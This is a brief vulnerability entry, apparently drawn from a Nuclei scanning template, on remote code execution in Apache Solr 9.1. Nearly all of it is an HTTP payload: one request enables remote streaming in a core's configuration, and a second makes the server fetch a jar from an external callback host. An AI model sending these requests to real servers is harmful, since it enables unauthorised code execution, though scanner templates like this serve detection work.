# Vulnerability: Apache Solr 9.1 - Remote Code Execution
**Classification:** CWE-15,CWE-94,CWE-99
**Source:** Nuclei Template (`apache-solr-rce.yaml`)

## Description
Apache Solr 9.1 is vulnerable to RCE.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /solr/gettingstarted_shard1_replica_n1/config HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{  "set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}

POST /solr/gettingstarted_shard2_replica_n1/debug/dump?param=ContentStreams HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=------------------------5897997e44b07bf9

--------------------------5897997e44b07bf9
Content-Disposition: form-data; name="stream.url"

jar:http://{{interactsh-url}}/test.jar?!/Test.class
--------------------------5897997e44b07bf9--
```

